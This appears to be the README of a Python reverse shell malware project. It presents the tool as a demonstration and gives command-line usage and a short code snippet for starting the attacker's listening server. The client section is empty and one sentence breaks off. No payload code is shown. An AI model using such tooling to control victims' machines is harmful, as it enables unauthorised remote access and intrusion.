<h1>Malware-ReverseShell</h1>
<p><b>This python malware-program is a presentation of how can reverse shell works.</b></p>
<p>Revershe shell is</p>
<p>Reverse shell malwares are divided into two main programs:</p>

<h2>Server Side Program</h2>
<p>Server side of the program belong to hacker/attacker.</p>
<p>Server program is started on specified ip address which can be as public as local with opened port. To this parameters is going to be victim connected. It is a console application so everything is happening inside of a console/terminal. </p>
<p>After successfully established connection attacker (server) can start sending pre-defined commands to victim (client). Some commands can be used before any client is connected (i named them server-side commands), but most of them are working only with connected client (server-client side commands).</p>

<h3>How does server-side python program work</h3>

<h4>Make server running and listening for upcomming connections</h4>

<b>Use console arguments</b>

<div>Show all possible commands/arguments</div>
<pre>python server.py --help</pre>

<div>Set ip address</div>
<pre>python server.py -ip [ip address]</pre>

<div>Set port</div>
<pre>python server.py -port [port]</pre>

<h5>If you don't want to manually set your ip address, you can use these arguments:</h5>
<div>Sets server on your local ip address</div>
<pre>python server.py -get-local-ip</pre>

<div>Sets server on your public ip address</div>
<pre>python server.py -get-external-ip</pre>

<b>Or just specify parameters in program</b>
```python
ip = '192.168.1.136'
port = 5000
server = Server(ip, port)
server.run()
```

<h2>Client Side Program</h2>
<h3>How does client-side python program work</h3>
